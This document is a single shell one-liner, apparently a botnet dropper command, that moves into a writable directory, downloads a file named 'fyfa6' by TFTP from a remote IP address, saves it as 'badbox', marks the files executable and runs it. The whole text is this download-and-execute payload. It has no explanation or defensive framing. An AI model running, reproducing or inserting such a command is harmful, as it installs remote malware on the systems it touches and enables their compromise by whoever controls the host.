cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 192.210.220.197 -c get fyfa6;cat fyfa6 >badbox;chmod +x *;./badbox
